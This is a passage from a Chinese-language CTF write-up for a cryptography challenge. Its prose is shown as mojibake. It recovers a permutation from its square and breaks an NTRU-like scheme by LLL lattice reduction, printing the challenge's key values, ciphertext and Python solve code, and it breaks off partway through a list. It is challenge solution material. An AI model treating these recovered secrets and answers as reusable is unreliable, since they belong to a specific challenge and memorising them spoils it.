class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"></span><br><span class="line">pubkey(q,h):(<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹ç¬¬äºŒéƒ¨åˆ†å…³äºmsgçš„è¿˜åŸ ä¸€ä¸ªå¾ˆç»å…¸çš„æ ¼<br>ç¬¬ä¸€éƒ¨åˆ†åˆ™æ˜¯å·²çŸ¥ç½®æ¢çš„å¹³æ–¹è¿˜åŸç½®æ¢ å‚è€ƒ<a href="https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group">https://dexterjie.github.io/2023/11/29/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023ISCTF/#baby-group</a></p>
<p>æ€è·¯å¾ˆæƒŠè‰³ ä»£ç å®ç°ä¹Ÿå¾ˆæœ‰éš¾åº¦ ä¸æ„§åªæœ‰2solves orz</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">	Chain = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):			</span><br><span class="line">		head = i</span><br><span class="line">		chain = [head]</span><br><span class="line">		c = P2[head]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">			chain.append(c)</span><br><span class="line">			c = P2[c]</span><br><span class="line">			<span class="keyword">if</span> c == head:				</span><br><span class="line">				<span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:	</span><br><span class="line">					lag = <span class="number">1</span></span><br><span class="line">					<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):		</span><br><span class="line">						<span class="keyword">for</span> l <span class="keyword">in</span> chain:				</span><br><span class="line">							<span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">								lag = <span class="number">0</span></span><br><span class="line">								<span class="keyword">break</span></span><br><span class="line">					<span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line">						<span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:			</span><br><span class="line">							Chain.append(chain[:-<span class="number">1</span>])</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							Chain.append(chain)</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å¯ä»¥æ‰¾åˆ°å…¶ä¸­æ‰€æœ‰çš„ç¯<br>å†æ ¹æ®å•ç¯å”¯ä¸€ç¡®å®š åˆ†è£‚å‡ºçš„åŒç¯æœ‰lenç§å¯èƒ½ åµŒå¥—å¾ªç¯æšä¸¾å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">			self.size = data</span><br><span class="line">			self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">			self._initialize()			</span><br><span class="line">		<span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">			self._<span class="built_in">list</span> = data</span><br><span class="line">			self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line">		<span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">		tempList = self._<span class="built_in">list</span></span><br><span class="line">		<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">			tempList = self._iterList(tempList, tempList)</span><br><span class="line">		<span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">		new_list = []</span><br><span class="line">		<span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">			new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line">		<span class="keyword">return</span> new_list</span><br><span class="line">q,h = (<span class="number">18172777775303192159727657832771688633216215598877965158949208820296023901084764760222881725262986702478735713462424007788959106272018399708244805316198640706589775789778454299532286932532522325791791312289833643271330941006206604894333175027113622330874626579800679513666624938603337561309816936129926352661091319564303604867093095700819543458178063985869752612663625872468653351930763784372987474747809415652595112648835928004343413910248386752899307068129610089712815257479121368111201632430687614657790581254030567845143865728745079851692195657361359959987504557281840928862881924309178036648485188421874327022341</span>, <span class="number">392638098592460228418508462226385074690422702429214284385732305774317959159895775092251586043956914155602546821559652111400517952111932579557319610857122515237088379905875982863782386657213421074126519458271560586678974481499715849371311979995450766948182818105567819897007307737370051632369390705725712223883589110699340619034611462216676501782567065261228166297471411589579035544131060706331012337024260046692910523900152236991203944000276133732456285962825434272960749340504092014446362862600803570698206213069473248298100863523331832957430305801141935737006263947843411592717969844892834332104365594346376118846</span>)</span><br><span class="line">c=<span class="number">4605640253217003331334964510174592254013178259349707648547335080743845433538772185582533054930473399495034133342299169373655297635370654237814250924077096784419954824350471683280656146814012837777204413608581553756866045890045788846665715321962704221105416079118007959490372975054302058194463432668018727266982561600329852084442818715440190956213811944269576719501924787366260795121132011879061730892865163591549129768412164655406373350666250339077746317309673325358941772202710386313434421388779073207650619564862431076222163014501544922959835509589742031678624743915535537547452120771609556012990490607104696154771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># M = Matrix(ZZ,2,2)</span></span><br><span class="line"><span class="comment"># M[0,0] = q</span></span><br><span class="line"><span class="comment"># M[0,1] = 0</span></span><br><span class="line"><span class="comment"># M[1,0] = h</span></span><br><span class="line"><span class="comment"># M[1,1] = 1</span></span><br><span class="line"><span class="comment"># Ge = M.LLL()</span></span><br><span class="line"><span class="comment"># for i in Ge:</span></span><br><span class="line"><span class="comment">#     g = int(abs(int(i[0])))</span></span><br><span class="line"><span class="comment">#     f = int(abs(int(i[-1])))</span></span><br><span class="line"><span class="comment">#     if f.bit_length()&gt;=1000:</span></span><br><span class="line"><span class="comment">#         print(f&#x27;g= &#123;g&#125;\nf= &#123;f&#125;&#x27;)</span></span><br><span class="line">g= <span class="number">80543133918404127488886301361326962793877182221425816412488158480855679387656522509067598512536004160200624450488501194899256437338964914229878803213278892167375927469338861409899138503409679804107844511855116009860285942703093653856978725198914922514759932610039646534971856735780113276875287001841258831367</span></span><br><span class="line">f= <span class="number">32114304664198200626949886557688567679378682689751764347873070091968817850723916157318846285817806084079915102989056457680818558130765168139779429885473027282918240513106424858891869095107110954431130817704525309921431164907347496920955065921260371828842317536589144089446549194267607829948059792467278739234</span></span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span class="number">177</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">207</span>, <span class="number">153</span>, <span class="number">28</span>, <span class="number">132</span>, <span class="number">168</span>, <span class="number">84</span>, <span class="number">166</span>, <span class="number">171</span>, <span class="number">108</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">128</span>, <span class="number">91</span>, <span class="number">68</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">152</span>]</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = ((c*f)%q)*modinv(f,g)%g</span><br><span class="line">msg = m%g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P2 = [<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span 